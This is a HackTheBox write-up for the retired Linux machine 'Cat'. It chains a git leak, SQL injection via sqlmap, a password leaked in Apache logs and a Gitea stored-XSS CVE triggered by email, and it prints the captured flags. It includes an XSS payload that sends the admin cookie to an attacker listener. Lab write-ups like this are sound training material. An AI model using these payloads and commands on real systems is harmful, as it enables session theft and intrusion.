---
layout: writeup
name: "Cat"
platform: "HackTheBox"
category: "retired"
difficulty: "Medium"
permalink: /writeups/retired/cat/
os: "Linux"
tags: [Web / SQLi / XSS / PrivEsc]
date: 2025-11-12
pwned: true
---
# 🐾 Cat — Hack The Box

**Difficulty:** Medium  
**IP:** `10.129.234.87`  
**OS:** Linux  
**Category:** Web / SQLi / XSS / PrivEsc  
**Status:** ✅ Done

---

## 🧭 Overview

- Git leak → XSS for admin cookie → SQLi for creds
- Web creds leaked via Apache logs
- Gitea (internal) → CVE-2024-6886 → stored XSS for file exfil
- Local mail + SWAKS abuse for XSS trigger
- Final privesc using extracted password

---

## 📡 Enumeration

```bash
nmap cat.htb
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

- `.git/` folder discovered → used `git-dumper` to recover full PHP source
- `view_cat.php` has stored XSS in username (reflected in DOM)
- XSS payload delivers stolen admin cookie to attacker via listener

```html
<img src=1 onerror=this.src="http://10.10.xx.xx/?ccc="+encodeURIComponent(document.cookie)>
```

- Logged in as admin via stolen cookie

---

## 🐱 SQL Injection

- Found in `accept_cat.php`: vulnerable `catName` param

```php
$sql_insert = "INSERT INTO accepted_cats (name) VALUES ('$cat_name')";
```

- SQLite DB revealed via `config.php` → file-based `/databases/cat.db`
- Exploited with `sqlmap` to extract user hashes

```bash
sqlmap -u "http://cat.htb/accept_cat.php" --cookie="PHPSESSID=..." --data="catId=1&catName=123" -p catName --dbms=SQLite --level=5
```

---

## 🧠 Credential Reuse & Log Leakage

- Cracked Rosa’s hash → logged in and read `/var/log/apache2/access.log`
- Found Axel’s creds in GET request:

```bash
cat /var/log/apache2/access.log | grep axel
GET /join.php?loginUsername=axel&loginPassword=aNdZwgC4tI9gnVXv_e3Q
```

---

## 🚪 Root Access (Port Forward + XSS)

- Port 3000 internally → Gitea service
- Forwarded with SSH:

```bash
ssh rosa@cat.htb -L 3000:127.0.0.1:3000
```

- Found Gitea 1.22.0 → vulnerable to stored XSS via CVE-2024-6886
- Discovered hint in `/var/mail/axel`: send an email to jobert to trigger XSS

```bash
swaks --to "jobert@localhost" --from "axel@localhost" --header "Click"   --body "http://localhost:3000/axel/xss" --server localhost
```

- XSS reads contents of restricted `index.php` → password inside
- Used to escalate to root

---

## 🏁 Flags

```bash
cat user.txt
56726c7c53163f6b2cddd30da152a32d

cat root.txt
b6503818144bada3cd5c62210f1427c7
```

---

## 🔍 Lessons Learned

- Git leaks can expose the entire source code & config
- Stored XSS is still highly viable when paired with internal mail or auto-fetch
- Apache logs may reveal sensitive credentials if login forms are GET-based
- Privilege escalation via chained misconfigs + creative exploitation